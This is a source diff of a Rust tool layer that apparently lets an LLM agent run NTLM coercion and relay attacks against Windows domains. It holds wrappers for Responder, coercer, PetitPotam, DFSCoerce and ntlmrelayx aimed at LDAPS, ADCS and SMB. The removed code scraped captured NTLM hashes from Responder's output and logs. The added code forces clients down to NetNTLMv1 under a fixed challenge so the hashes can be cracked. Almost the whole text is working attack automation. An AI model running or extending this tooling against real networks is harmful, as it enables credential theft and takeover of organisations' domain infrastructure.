@@ -7,7 +7,6 @@ use std::io::Write;
 use std::net::TcpListener;
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
-use std::sync::Arc;
 use std::time::{Duration, Instant};
 
 use anyhow::{Context, Result};
@@ -15,535 +14,34 @@ use base64::Engine;
 use serde_json::Value;
 use tokio::process::{Child, Command as TokioCommand};
 use tokio::time::sleep;
-use tracing::warn;
 
 use crate::args::{optional_bool, optional_str, required_str};
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
-/// Resolve the listener / attacker IP for a coercion call. The orchestrator
-/// no longer auto-detects its own egress (which was wrong: the orchestrator
-/// and coercion worker run on different k8s pods with different IPs).
-/// Instead, the worker is the source of truth — it derives its own egress IP
-/// at tool-execution time using the route-trick on 8.8.8.8:53. An explicit
-/// `supplied` value still overrides, but must be bindable on this worker.
-///
-/// Behavior:
-/// - Empty `supplied`: derive worker egress IP silently — the expected path.
-/// - Non-empty `supplied` that IS local: use it as-is.
-/// - Non-empty `supplied` that is NOT local: derive and warn (real misconfig
-///   — operator set ARES_LISTENER_IP to something this worker can't bind).
-fn resolve_listener_ip(supplied: &str) -> Result<String> {
-    use std::net::{IpAddr, UdpSocket};
-
-    let derive = || -> Result<String> {
-        let sock =
-            UdpSocket::bind("0.0.0.0:0").context("resolve_listener_ip: bind 0.0.0.0:0 failed")?;
-        sock.connect("8.8.8.8:53")
-            .context("resolve_listener_ip: connect to 8.8.8.8:53 failed")?;
-        let local = sock
-            .local_addr()
-            .context("resolve_listener_ip: local_addr failed")?;
-        let resolved = local.ip().to_string();
-        if resolved.starts_with("127.") {
-            anyhow::bail!(
-                "resolve_listener_ip: no usable non-loopback IP available on this worker"
-            );
-        }
-        Ok(resolved)
-    };
-
-    if supplied.is_empty() {
-        return derive();
-    }
-
-    let parsed: Option<IpAddr> = supplied.parse().ok();
-    let is_local = match parsed {
-        Some(ip) if !ip.is_loopback() && !ip.is_unspecified() && !ip.is_multicast() => {
-            UdpSocket::bind((ip, 0)).is_ok()
-        }
-        _ => false,
-    };
-    if is_local {
-        return Ok(supplied.to_string());
-    }
-
-    let resolved = derive()?;
-    warn!(
-        supplied = %supplied,
-        substituted = %resolved,
-        "coercion: supplied listener IP is not local on this worker; substituting egress IP \
-         (set ARES_LISTENER_IP per worker if you need a specific value)"
-    );
-    Ok(resolved)
-}
-
-/// Sentinel emitted by the standalone coerce tools when no relay listener is
-/// bound on `<listener_ip>:445` at dispatch time. Firing a coerce in that
-/// state sends the DC's NTLM auth packets to a kernel-RST'd port — the bug
-/// reproducer that motivated this check (DC SYNs to attacker:445, no
-/// listener, TCP RST, hash never captured). The orchestrator should treat
-/// this the same way it treats `RELAY_BIND_BUSY`: bail the coerce, route
-/// through `relay_and_coerce` (which spawns its own ntlmrelayx listener) or
-/// start `responder`/`ntlmrelayx_to_*` first.
-pub(crate) const NO_RELAY_LISTENER_SENTINEL: &str = "NO_RELAY_LISTENER";
-
-/// Probe `<host>:<port>` for a bound listener. `Ok(())` when something
-/// accepts the TCP handshake; `Err(reason)` on connection refused, timeout,
-/// or other connect error. Inverse of [`wait_for_port_free`].
-///
-/// Used by the standalone `coercer` / `petitpotam` / `dfscoerce` tools to
-/// preflight that *something* (responder, ntlmrelayx, smbd) is bound on the
-/// listener IP before they trigger the DC. Without this, the DC's auth
-/// packets land on a kernel RST and the operator sees a silent hash miss.
-///
-/// Polls for up to ~2s (10 attempts at 200ms intervals). The retry exists
-/// because impacket-ntlmrelayx and Responder take ~500-1500ms to bind their
-/// listener sockets after spawn — a one-shot probe races the spawn and bails
-/// before the listener is up, which silently broke the LLM agent pattern of
-/// `ntlmrelayx_to_*` (one tool call) → coercer (next tool call). Successful
-/// callers return on the first probe with no added latency.
-async fn verify_listener_present(host: &str, port: u16) -> std::result::Result<(), String> {
-    #[cfg(test)]
-    {
-        // Default test behavior: skip the probe so the existing `*_executes`
-        // tests still exercise their subprocess mocks. Tests that want to
-        // assert the preflight path opt in via PROBE_REAL_LISTENER_IN_TEST.
-        if !PROBE_REAL_LISTENER_IN_TEST.with(|c| c.get()) {
-            return Ok(());
-        }
-    }
-    use tokio::net::TcpStream;
-    let addr = format!("{host}:{port}");
-    let attempts = 10u32;
-    let interval = Duration::from_millis(200);
-    let mut last_err: String = format!("no probe attempted on {addr}");
-    for _ in 0..attempts {
-        let probe =
-            tokio::time::timeout(Duration::from_millis(300), TcpStream::connect(&addr)).await;
-        match probe {
-            Ok(Ok(_)) => return Ok(()),
-            Ok(Err(e)) if e.kind() == std::io::ErrorKind::ConnectionRefused => {
-                last_err = format!("nothing listening on {addr}");
-            }
-            Ok(Err(e)) => {
-                last_err = format!("probe error on {addr}: {e}");
-            }
-            Err(_) => {
-                last_err = format!("connect probe to {addr} timed out");
-            }
-        }
-        tokio::time::sleep(interval).await;
-    }
-    Err(last_err)
-}
-
-#[cfg(test)]
-thread_local! {
-    /// When set on a test thread, [`verify_listener_present`] does the real
-    /// TCP probe. Default-off so the `*_executes` tests can keep mocking the
-    /// subprocess layer without arranging a real listener.
-    static PROBE_REAL_LISTENER_IN_TEST: std::cell::Cell<bool> =
-        const { std::cell::Cell::new(false) };
-}
-
-fn no_listener_output(tool: &str, host: &str, reason: &str) -> ToolOutput {
-    ToolOutput {
-        stdout: format!(
-            "{NO_RELAY_LISTENER_SENTINEL}\n{tool}: no relay listener bound on \
-             {host}:445 ({reason}). Coercing a DC with nothing listening sends \
-             its NTLM auth to a kernel RST. Spawn `responder` or one of the \
-             `ntlmrelayx_to_*` tools first, or use the composite \
-             `relay_and_coerce` tool which spawns its own listener."
-        ),
-        stderr: String::new(),
-        exit_code: Some(0),
-        success: false,
-    }
-}
-
-#[cfg(test)]
-thread_local! {
-    /// When true, the standalone coerce wrappers skip the auto-Responder
-    /// spawn path so subprocess-mock tests keep validating their own
-    /// invocations instead of the auto-responder composite. Default-on in
-    /// tests; dedicated tests for the auto-responder path flip it off.
-    static SKIP_AUTO_RESPONDER_IN_TEST: std::cell::Cell<bool> =
-        const { std::cell::Cell::new(true) };
-}
-
-/// RAII wrapper around a backgrounded Responder process spawned by the
-/// standalone coerce tools. Drops kill the child via `kill_on_drop` so the
-/// SMB listener (445), HTTP (80), and the other Responder ports release as
-/// soon as the coerce call returns.
-struct ResponderHandle {
-    _child: tokio::process::Child,
-    stdout_buf: Arc<tokio::sync::Mutex<String>>,
-    stderr_buf: Arc<tokio::sync::Mutex<String>>,
-}
-
-impl ResponderHandle {
-    async fn captured_output(&self) -> String {
-        let out = self.stdout_buf.lock().await.clone();
-        let err = self.stderr_buf.lock().await.clone();
-        if err.trim().is_empty() {
-            out
-        } else {
-            format!("{out}\n--- responder stderr ---\n{err}")
-        }
-    }
-}
-
-/// Find the Linux interface name whose primary IPv4 address matches
-/// `listener_ip`. Used by the standalone coerce tools to feed Responder
-/// `-I <iface>`. Returns `Err` when the IP isn't bound on any non-loopback
-/// interface — meaning we don't own the listener address, so starting
-/// Responder on the wrong NIC would capture nothing.
-async fn interface_for_listener_ip(listener_ip: &str) -> std::result::Result<String, String> {
-    let out = tokio::process::Command::new("ip")
-        .arg("-o")
-        .arg("-4")
-        .arg("addr")
-        .arg("show")
-        .output()
-        .await
-        .map_err(|e| format!("failed to spawn `ip -o -4 addr show`: {e}"))?;
-    if !out.status.success() {
-        return Err(format!(
-            "`ip -o -4 addr show` exited {} stderr={}",
-            out.status,
-            String::from_utf8_lossy(&out.stderr)
-        ));
-    }
-    let text = String::from_utf8_lossy(&out.stdout);
-    for line in text.lines() {
-        // Format: "<idx>: <iface>    inet <ip>/<prefix> ..."
-        let mut fields = line.split_whitespace();
-        let _idx = fields.next();
-        let Some(iface_raw) = fields.next() else {
-            continue;
-        };
-        let iface = iface_raw.trim_end_matches(':');
-        if iface == "lo" {
-            continue;
-        }
-        let _inet = fields.next();
-        let Some(cidr) = fields.next() else {
-            continue;
-        };
-        let ip = cidr.split('/').next().unwrap_or("");
-        if ip == listener_ip {
-            return Ok(iface.to_string());
-        }
-    }
-    Err(format!(
-        "no non-loopback interface owns {listener_ip} \
-         (per `ip -o -4 addr show`)"
-    ))
-}
-
-/// Spawn Responder backgrounded on the given interface. Streams stdout and
-/// stderr into in-memory buffers so the caller can scrape captured NTLMv2
-/// hashes after the coerce phase runs. The handle's `Drop` SIGKILLs
-/// Responder via `kill_on_drop(true)` so the listener releases as soon as
-/// the standalone coerce call returns.
-///
-/// Returns `Err` when:
-///   - the `responder` binary isn't on `$PATH`,
-///   - Responder dies before binding 445 (port conflict, capability error),
-///   - 445 doesn't bind within `bind_timeout`.
-async fn spawn_responder(
-    interface: &str,
-    listener_ip: &str,
-    bind_timeout: Duration,
-) -> std::result::Result<ResponderHandle, String> {
-    use tokio::io::AsyncBufReadExt;
-    let mut cmd = tokio::process::Command::new("responder");
-    // Minimal invocation — `-I <iface>` is enough to start the SMB listener
-    // with Responder's default config; hashes land on stdout AND in
-    // /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt. The previous `-wd`
-    // wasn't a valid combined-form on all Responder builds and silently
-    // dropped Responder into a no-listener mode on some Kali rolls.
-    cmd.arg("-I")
-        .arg(interface)
-        .stdin(Stdio::null())
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .kill_on_drop(true);
-    cmd.process_group(0);
-
-    let mut child = cmd
-        .spawn()
-        .map_err(|e| format!("failed to spawn `responder -I {interface}`: {e}"))?;
-
-    let stdout_buf = Arc::new(tokio::sync::Mutex::new(String::new()));
-    let stderr_buf = Arc::new(tokio::sync::Mutex::new(String::new()));
-
-    if let Some(out) = child.stdout.take() {
-        let buf = stdout_buf.clone();
-        tokio::spawn(async move {
-            let mut reader = tokio::io::BufReader::new(out).lines();
-            while let Ok(Some(line)) = reader.next_line().await {
-                let mut guard = buf.lock().await;
-                guard.push_str(&line);
-                guard.push('\n');
-            }
-        });
-    }
-    if let Some(err) = child.stderr.take() {
-        let buf = stderr_buf.clone();
-        tokio::spawn(async move {
-            let mut reader = tokio::io::BufReader::new(err).lines();
-            while let Ok(Some(line)) = reader.next_line().await {
-                let mut guard = buf.lock().await;
-                guard.push_str(&line);
-                guard.push('\n');
-            }
-        });
-    }
-
-    let deadline = Instant::now() + bind_timeout;
-    loop {
-        if let Ok(Some(status)) = child.try_wait() {
-            let stderr = stderr_buf.lock().await.clone();
-            let stdout = stdout_buf.lock().await.clone();
-            return Err(format!(
-                "responder exited before binding 445 (status={status}): \
-                 stderr={stderr} stdout={stdout}"
-            ));
-        }
-        // Inline probe — the cfg(test) bypass in verify_listener_present
-        // would always return Ok in tests, defeating spawn_responder's
-        // bind-detection guard.
-        let bound = tokio::time::timeout(
-            Duration::from_millis(300),
-            tokio::net::TcpStream::connect(format!("{listener_ip}:445")),
-        )
-        .await
-        .map(|r| r.is_ok())
-        .unwrap_or(false);
-        if bound {
-            return Ok(ResponderHandle {
-                _child: child,
-                stdout_buf,
-                stderr_buf,
-            });
-        }
-        if Instant::now() >= deadline {
-            let stderr = stderr_buf.lock().await.clone();
-            return Err(format!(
-                "responder didn't bind {listener_ip}:445 within {bind_timeout:?} \
-                 (stderr={stderr})"
-            ));
-        }
-        sleep(Duration::from_millis(250)).await;
-    }
-}
-
-/// Read freshly-written `SMB-NTLMv2-SSP-*.txt` files from Responder's log
-/// directory and return any hash lines found. Responder writes the hash
-/// verbatim — one line per capture in the canonical hashcat netntlmv2
-/// format. We restrict to files modified within the last 60s so prior-op
-/// hashes don't pollute the result.
-///
-/// This is the authoritative source: stdout capture races against process
-/// teardown and on some Kali rolls Responder buffers stdout so heavily
-/// that we never see the line before SIGKILL. The on-disk file is written
-/// synchronously inside Responder's hash-capture path.
-async fn scrape_responder_log_dir() -> Vec<String> {
-    use std::time::SystemTime;
-    let log_dirs = [
-        "/usr/share/responder/logs",
-        "/var/lib/responder/logs",
-        "/opt/responder/logs",
-    ];
-    let mut out: Vec<String> = Vec::new();
-    let cutoff = SystemTime::now()
-        .checked_sub(Duration::from_secs(60))
-        .unwrap_or(SystemTime::UNIX_EPOCH);
-    for dir in &log_dirs {
-        let Ok(mut rd) = tokio::fs::read_dir(dir).await else {
-            continue;
-        };
-        while let Ok(Some(entry)) = rd.next_entry().await {
-            let name = entry.file_name();
-            let name_str = name.to_string_lossy();
-            // Both SMB-NTLMv2-SSP-*.txt (modern) and SMB-NTLMv2-*.txt are
-            // shapes Responder has used over releases.
-            if !(name_str.starts_with("SMB-NTLMv2") && name_str.ends_with(".txt")) {
-                continue;
-            }
-            if let Ok(meta) = entry.metadata().await {
-                if let Ok(mtime) = meta.modified() {
-                    if mtime < cutoff {
-                        continue;
-                    }
-                }
-            }
-            let Ok(text) = tokio::fs::read_to_string(entry.path()).await else {
-                continue;
-            };
-            for line in text.lines() {
-                let trimmed = line.trim();
-                if trimmed.contains("::")
-                    && !trimmed.is_empty()
-                    && !out.iter().any(|h| h == trimmed)
-                {
-                    out.push(trimmed.to_string());
-                }
-            }
-        }
-    }
-    out
-}
-
-/// Pull NTLMv1/NTLMv2 hash lines out of a Responder stdout dump. Responder
-/// prints them as `[SMB] NTLMv2-SSP Hash : <user>::<domain>:...` (with
-/// `NTLMv1-SSP` / `NTLMv1` / `NTLMv2` variants depending on what the client
-/// negotiated). The dedup is positional — same hash captured twice (e.g. a
-/// DC retransmit) yields a single entry.
-fn extract_responder_hashes(output: &str) -> Vec<String> {
-    let mut hashes = Vec::new();
-    for line in output.lines() {
-        let line = line.trim();
-        for marker in [
-            "NTLMv2-SSP Hash",
-            "NTLMv1-SSP Hash",
-            "NTLMv1 Hash",
-            "NTLMv2 Hash",
-        ] {
-            if let Some((_pre, rest)) = line.split_once(marker) {
-                if let Some((_, hash)) = rest.split_once(':') {
-                    let hash = hash.trim();
-                    if !hash.is_empty() && !hashes.iter().any(|h| h == hash) {
-                        hashes.push(hash.to_string());
-                    }
-                }
-            }
-        }
-    }
-    hashes
-}
-
-/// Run a standalone coerce subprocess with an auto-spawned Responder when
-/// no listener is already bound on `<listener_ip>:445`. Combines the
-/// coerce stdout with any hashes Responder caught so the LLM agent sees a
-/// single self-contained result instead of needing to compose two blocking
-/// tool calls (which can't share a listener because each tool call awaits
-/// its subprocess exit before the agent can issue the next call).
-///
-/// When something is already on 445 (operator-started Responder, in-flight
-/// ntlmrelayx), we skip spawning our own and just run the coerce.
-async fn run_coerce_with_auto_responder<F, Fut>(
-    tool_label: &str,
-    listener_ip: &str,
-    coerce: F,
-) -> Result<ToolOutput>
-where
-    F: FnOnce() -> Fut,
-    Fut: std::future::Future<Output = Result<ToolOutput>>,
-{
-    #[cfg(test)]
-    {
-        if SKIP_AUTO_RESPONDER_IN_TEST.with(|c| c.get()) {
-            return coerce().await;
-        }
-    }
-    if verify_listener_present(listener_ip, 445).await.is_ok() {
-        return coerce().await;
-    }
-
-    let interface = match interface_for_listener_ip(listener_ip).await {
-        Ok(iface) => iface,
-        Err(reason) => {
-            return Ok(no_listener_output(tool_label, listener_ip, &reason));
-        }
-    };
-
-    let responder = match spawn_responder(&interface, listener_ip, Duration::from_secs(8)).await {
-        Ok(h) => h,
-        Err(reason) => {
-            return Ok(no_listener_output(tool_label, listener_ip, &reason));
-        }
-    };
-
-    let coerce_result = coerce().await;
-
-    // Settle so Responder catches retransmits the DC sends after the
-    // coerce subprocess exits — 15s covers Windows SMB session-setup retry
-    // behavior (3 retries × ~5s) plus the DC's NTLM response time.
-    sleep(Duration::from_secs(15)).await;
-
-    let responder_dump = responder.captured_output().await;
-    drop(responder); // SIGKILL, release 445
-
-    // Two sources for captured hashes:
-    //  1. Responder stdout (in-memory, captured during run).
-    //  2. /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt — authoritative;
-    //     Responder writes hashes to disk even when stdout is buffered or
-    //     swallowed by the parent (we've seen this on some Kali rolls).
-    // Merge both, dedup by exact hash line.
-    let mut hashes = extract_responder_hashes(&responder_dump);
-    for fs_hash in scrape_responder_log_dir().await {
-        if !hashes.iter().any(|h| h == &fs_hash) {
-            hashes.push(fs_hash);
-        }
-    }
-    let mut combined = match coerce_result {
-        Ok(out) => out,
-        Err(e) => ToolOutput {
-            stdout: format!("coerce subprocess error: {e}"),
-            stderr: String::new(),
-            exit_code: Some(1),
-            success: false,
-        },
-    };
-
-    combined
-        .stdout
-        .push_str("\n=== AUTO-RESPONDER CAPTURE ===\n");
-    if hashes.is_empty() {
-        combined.stdout.push_str(
-            "no NTLM hashes captured by auto-Responder in this window \
-             (DC may have refused auth, signing may be enforced, or the \
-             coerce method may not have triggered).\n",
-        );
-    } else {
-        combined
-            .stdout
-            .push_str(&format!("CAPTURED_HASH_COUNT={}\n", hashes.len()));
-        for h in &hashes {
-            combined.stdout.push_str("CAPTURED_HASH=");
-            combined.stdout.push_str(h);
-            combined.stdout.push('\n');
-        }
-        // Captured hashes turn the call into a success even if the coerce
-        // subprocess itself exited non-zero — some methods print an EFSR
-        // error AFTER the DC has already auth'd to our listener.
-        combined.success = true;
-    }
-    combined.stdout.push_str("=== RESPONDER LOG TAIL ===\n");
-    const RESPONDER_TAIL_BYTES: usize = 8 * 1024;
-    let tail = if responder_dump.len() > RESPONDER_TAIL_BYTES {
-        &responder_dump[responder_dump.len() - RESPONDER_TAIL_BYTES..]
-    } else {
-        &responder_dump[..]
-    };
-    combined.stdout.push_str(tail);
-
-    Ok(combined)
-}
-
 /// Start Responder on a network interface to capture NTLM hashes.
 ///
-/// Optional args: `interface` (default "eth0"), `analyze_mode`
+/// Optional args: `interface` (default "eth0"), `analyze_mode`,
+/// `force_ntlmv1`.
+///
+/// `force_ntlmv1` adds Responder's `--lm --disable-ess` flags, forcing clients
+/// with `LmCompatibilityLevel <= 2` to negotiate NetNTLMv1 instead of v2.
+/// Combined with the static server challenge the `coercion_tools` role pins in
+/// `Responder.conf` (`1122334455667788`), captured v1 hashes are crack.sh
+/// rainbow-table candidates. `analyze_mode` (`-A`) is a *passive* mode that
+/// captures nothing — it is NOT a downgrade flag, so the two knobs are
+/// independent (combining them is pointless: analyze mode never poisons, so no
+/// hash is captured to downgrade).
 pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
     let interface = optional_str(args, "interface").unwrap_or("eth0");
     let analyze_mode = optional_bool(args, "analyze_mode").unwrap_or(false);
+    let force_ntlmv1 = optional_bool(args, "force_ntlmv1").unwrap_or(false);
 
     CommandBuilder::new("responder")
         .flag("-I", interface)
         .arg_if(analyze_mode, "-A")
+        .arg_if(force_ntlmv1, "--lm")
+        .arg_if(force_ntlmv1, "--disable-ess")
         .timeout_secs(30)
         .execute()
         .await
@@ -570,36 +68,23 @@ pub async fn start_mitm6(args: &Value) -> Result<ToolOutput> {
 /// Required args: `target`, `listener`
 /// Optional args: `username`, `password`, `domain`
 pub async fn coercer(args: &Value) -> Result<ToolOutput> {
-    let target = required_str(args, "target")?.to_string();
+    let target = required_str(args, "target")?;
     let listener = required_str(args, "listener")?;
-    let username = optional_str(args, "username").map(str::to_string);
-    let password = optional_str(args, "password").map(str::to_string);
-    let domain = optional_str(args, "domain").map(str::to_string);
+    let username = optional_str(args, "username");
+    let password = optional_str(args, "password");
+    let domain = optional_str(args, "domain");
 
-    let listener = resolve_listener_ip(listener)?;
-
-    let listener_for_coerce = listener.clone();
-    run_coerce_with_auto_responder("coercer", &listener, || async move {
-        let mut cmd = CommandBuilder::new("coercer")
-            .arg("coerce")
-            .flag("-t", target.as_str())
-            .flag("-l", &listener_for_coerce)
-            .arg("--always-continue")
-            .timeout_secs(120);
-
-        if let Some(u) = username.as_deref() {
-            cmd = cmd.flag("-u", u);
-        }
-        if let Some(p) = password.as_deref() {
-            cmd = cmd.flag("-p", p);
-        }
-        if let Some(d) = domain.as_deref() {
-            cmd = cmd.flag("-d", d);
-        }
-
-        cmd.execute().await
-    })
-    .await
+    CommandBuilder::new("coercer")
+        .arg("coerce")
+        .flag("-t", target)
+        .flag("-l", listener)
+        .arg("--always-continue")
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(120)
+        .execute()
+        .await
 }
 
 /// Coerce NTLM authentication via MS-EFSR (PetitPotam).
@@ -607,37 +92,24 @@ pub async fn coercer(args: &Value) -> Result<ToolOutput> {
 /// Required args: `target`, `listener`
 /// Optional args: `username`, `password`, `domain`
 pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
-    let target = required_str(args, "target")?.to_string();
+    let target = required_str(args, "target")?;
     let listener = required_str(args, "listener")?;
-    let username = optional_str(args, "username").map(str::to_string);
-    let password = optional_str(args, "password").map(str::to_string);
-    let domain = optional_str(args, "domain").map(str::to_string);
+    let username = optional_str(args, "username");
+    let password = optional_str(args, "password");
+    let domain = optional_str(args, "domain");
 
-    let listener = resolve_listener_ip(listener)?;
-
-    let listener_for_coerce = listener.clone();
-    run_coerce_with_auto_responder("petitpotam", &listener, || async move {
-        let mut cmd = CommandBuilder::new("coercer")
-            .arg("coerce")
-            .flag("-t", target.as_str())
-            .flag("-l", &listener_for_coerce)
-            .args(["--filter-protocol-name", "MS-EFSR"])
-            .arg("--always-continue")
-            .timeout_secs(60);
-
-        if let Some(u) = username.as_deref() {
-            cmd = cmd.flag("-u", u);
-        }
-        if let Some(p) = password.as_deref() {
-            cmd = cmd.flag("-p", p);
-        }
-        if let Some(d) = domain.as_deref() {
-            cmd = cmd.flag("-d", d);
-        }
-
-        cmd.execute().await
-    })
-    .await
+    CommandBuilder::new("coercer")
+        .arg("coerce")
+        .flag("-t", target)
+        .flag("-l", listener)
+        .args(["--filter-protocol-name", "MS-EFSR"])
+        .arg("--always-continue")
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
@@ -645,51 +117,21 @@ pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
 /// Required args: `target`, `listener`
 /// Optional args: `username`, `password`, `domain`
 pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
-    let target = required_str(args, "target")?.to_string();
+    let target = required_str(args, "target")?;
     let listener = required_str(args, "listener")?;
-    let username = optional_str(args, "username").map(str::to_string);
-    let password = optional_str(args, "password").map(str::to_string);
-    let domain = optional_str(args, "domain").map(str::to_string);
+    let username = optional_str(args, "username");
+    let password = optional_str(args, "password");
+    let domain = optional_str(args, "domain");
 
-    let listener = resolve_listener_ip(listener)?;
-
-    let listener_for_coerce = listener.clone();
-    run_coerce_with_auto_responder("dfscoerce", &listener, || async move {
-        dfscoerce_inner(
-            target.as_str(),
-            &listener_for_coerce,
-            username.as_deref(),
-            password.as_deref(),
-            domain.as_deref(),
-        )
-        .await
-    })
-    .await
-}
-
-async fn dfscoerce_inner(
-    target: &str,
-    listener: &str,
-    username: Option<&str>,
-    password: Option<&str>,
-    domain: Option<&str>,
-) -> Result<ToolOutput> {
-    let mut cmd = CommandBuilder::new("dfscoerce")
+    CommandBuilder::new("dfscoerce")
         .arg(listener)
         .arg(target)
-        .timeout_secs(60);
-
-    if let Some(u) = username {
-        cmd = cmd.flag("-u", u);
-    }
-    if let Some(p) = password {
-        cmd = cmd.flag("-p", p);
-    }
-    if let Some(d) = domain {
-        cmd = cmd.flag("-d", d);
-    }
-
-    cmd.execute().await
+        .flag_opt("-u", username)
+        .flag_opt("-p", password)
+        .flag_opt("-d", domain)
+        .timeout_secs(60)
+        .execute()
+        .await
 }
 
 /// Standalone-relay BUSY response. Standalone `ntlmrelayx_to_*` tools share
@@ -719,7 +161,7 @@ pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
     let dc_ip = required_str(args, "dc_ip")?;
     let delegate_access = optional_bool(args, "delegate_access").unwrap_or(false);
 
-    let Some(_lock) = acquire_relay_lock(STANDALONE_RELAY_LOCK_WAIT).await else {
+    let Some(_lock) = try_acquire_relay_lock() else {
         return Ok(relay_busy_output("ntlmrelayx_to_ldaps"));
     };
 
@@ -728,7 +170,7 @@ pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
     CommandBuilder::new("impacket-ntlmrelayx")
         .flag("-t", target_url)
         .arg_if(delegate_access, "--delegate-access")
-        .timeout_secs(600)
+        .timeout_secs(120)
         .execute()
         .await
 }
@@ -741,7 +183,7 @@ pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
     let ca_host = required_str(args, "ca_host")?;
     let template = optional_str(args, "template");
 
-    let Some(_lock) = acquire_relay_lock(STANDALONE_RELAY_LOCK_WAIT).await else {
+    let Some(_lock) = try_acquire_relay_lock() else {
         return Ok(relay_busy_output("ntlmrelayx_to_adcs"));
     };
 
@@ -751,7 +193,7 @@ pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
         .flag("-t", target_url)
         .arg("--adcs")
         .flag_opt("--template", template)
-        .timeout_secs(600)
+        .timeout_secs(120)
         .execute()
         .await
 }
@@ -765,7 +207,7 @@ pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
     let socks = optional_bool(args, "socks").unwrap_or(false);
     let interactive = optional_bool(args, "interactive").unwrap_or(false);
 
-    let Some(_lock) = acquire_relay_lock(STANDALONE_RELAY_LOCK_WAIT).await else {
+    let Some(_lock) = try_acquire_relay_lock() else {
         return Ok(relay_busy_output("ntlmrelayx_to_smb"));
     };
 
@@ -773,7 +215,7 @@ pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
         .flag("-t", target_ip)
         .arg_if(socks, "-socks")
         .arg_if(interactive, "-i")
-        .timeout_secs(600)
+        .timeout_secs(120)
         .execute()
         .await
 }
@@ -818,17 +260,17 @@ fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
     let coerce_password = optional_str(args, "coerce_password").filter(|s| !s.is_empty());
     let template = optional_str(args, "template").unwrap_or("DomainController");
 
-    // Same-host coerce + relay used to be rejected here on loopback grounds.
-    // That's only true for SMB→SMB / HTTP→SMB relay; the loopback check
-    // (MS16-075 / KB5005413) keys on the inbound auth protocol matching the
-    // outbound relay protocol on the same target. ESC8/ESC11 default to
-    // SMB→HTTP (web enrollment) and the equivalent SMB→RPC (ICPR), and IIS
-    // does not refuse a relayed NTLM auth that comes back to itself from a
-    // different protocol. Empirically the same-host chain captures a valid
-    // PFX in production lab runs against single-DC contoso forests. Keeping the
-    // self-coerce as a last-tier candidate gives the orchestrator a fallback
-    // when no foreign DC is reachable for cross-host coercion — without it,
-    // a single-DC forest with ESC8 was unreachable through the auto chain.
+    // Source ≠ target. Coercing the CA host itself triggers same-machine
+    // NTLM loopback rejection at IIS. Conservative literal compare — callers
+    // mixing hostname/IP across the two args still slip through, that's their
+    // problem to keep distinct.
+    if coerce_target == ca_host {
+        anyhow::bail!(
+            "relay_and_coerce: coerce_target ({coerce_target}) must differ from ca_host \
+             ({ca_host}); same-machine NTLM loopback protection blocks relayed auth. \
+             Coerce a different machine account (e.g. another DC) and relay it to this CA."
+        );
+    }
 
     if coerce_user.is_some() && coerce_hash.is_none() && coerce_password.is_none() {
         anyhow::bail!(
@@ -946,11 +388,6 @@ struct RunOptions {
     poll_phase_1: Duration,
     poll_phase_2: Duration,
     poll_phase_3: Duration,
-    /// Cert-poll window for the new Phase 0 (`coercer --filter-method-name=
-    /// EfsRpcOpenFileRaw`). Matches phase 1 — coercer fires the RPC fast,
-    /// then the DC's auth + ntlmrelayx's adcs-attack writeback take a
-    /// handful of seconds.
-    poll_phase_0: Duration,
     post_capture_settle: Duration,
     relay_kill_timeout: Duration,
     keep_workdir_on_capture: bool,
@@ -965,32 +402,13 @@ struct RunOptions {
     /// Linux; an unmanaged smbd / samba-vfs holder never clears, so we
     /// surface the situation rather than letting ntlmrelayx crash.
     bind_check: Duration,
-    /// How long to wait for the host-wide relay-lock sentinel (loopback
-    /// port 41445) to release before bailing with `RELAY_BIND_BUSY`. With a
-    /// non-zero wait, concurrent `relay_and_coerce` invocations queue rather
-    /// than the loser bailing immediately and the orchestrator retrying on
-    /// the next 5s tick (which previously produced the BIND_BUSY storm and
-    /// the LLM "I cannot start the listener" assistance loop). Production:
-    /// 120s — covers a typical phase-walk plus settle. Tests: 0 — keeps
-    /// the existing fail-fast contention assertion.
-    relay_lock_wait: Duration,
 }
-
-/// Per-phase coerce subprocess wall-clock cap inside `relay_and_coerce`.
-/// 25s (the original value) was too tight for authenticated `coercer` calls
-/// against real DCs — RPC + Kerberos handshake routinely exceeds it before
-/// the protocol-level RPC even fires, surfacing as `timed out after 25s` in
-/// the coerce log with no chance to inspect server response. 90s comfortably
-/// covers the slow paths without blocking other coercion candidates for long
-/// when this attempt has truly hung.
-const COERCE_PHASE_TIMEOUT_SECS: u64 = 90;
 
 impl RunOptions {
     fn production() -> Self {
         Self {
             relay_settle: Duration::from_secs(3),
             poll_interval: Duration::from_millis(500),
-            poll_phase_0: Duration::from_secs(8),
             poll_phase_1: Duration::from_secs(8),
             poll_phase_2: Duration::from_secs(10),
             poll_phase_3: Duration::from_secs(8),
@@ -999,17 +417,9 @@ impl RunOptions {
             keep_workdir_on_capture: true,
             acquire_host_lock: true,
             bind_check: Duration::from_secs(10),
-            relay_lock_wait: Duration::from_secs(120),
         }
     }
 }
-
-/// Wait for the standalone `ntlmrelayx_to_*` tools to acquire the host-wide
-/// relay-lock sentinel. Shorter than the composite `relay_and_coerce` wait
-/// because these tools are LLM-driven and the agent should see the BIND_BUSY
-/// quickly enough to pivot rather than hold the whole agent loop hostage for
-/// minutes.
-const STANDALONE_RELAY_LOCK_WAIT: Duration = Duration::from_secs(30);
 
 /// Wait for the given TCP port to become free on `0.0.0.0`. Polls every
